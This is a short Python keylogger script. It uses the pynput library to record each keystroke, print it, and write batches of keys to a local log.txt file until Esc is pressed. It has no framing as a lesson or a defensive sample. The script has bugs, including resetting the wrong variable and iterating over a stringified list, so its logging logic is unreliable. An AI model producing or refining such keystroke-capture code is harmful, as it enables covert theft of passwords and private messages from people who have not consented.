import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def onpress(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 20:
        count = 0
        writefile(str(keys))
        key = []

def writefile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def onrelease(key):
    if key == Key.esc:
        return False



with Listener(on_press=onpress,on_release=onrelease) as listner:
    listner.join()
